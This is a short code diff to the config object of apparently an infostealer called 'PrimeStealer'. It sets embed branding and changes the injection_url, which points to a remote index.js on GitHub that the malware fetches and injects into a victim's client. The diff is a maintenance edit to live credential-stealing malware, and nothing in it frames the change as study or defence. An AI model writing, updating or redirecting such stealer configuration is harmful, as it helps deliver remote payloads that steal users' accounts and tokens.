@@ -14,7 +14,7 @@ const config = {
   embed_name: 'PrimeStealer Injection',
   embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'.replace(/ /g, '%20'),
   embed_color: 000000,
-  injection_url: 'https://raw.githubusercontent.com/DecariusWoods1/Injection/main/index.js',
+  injection_url: 'https://raw.githubusercontent.com/PrimeInj/Injection/main/index.js',
   /**
    
    **/
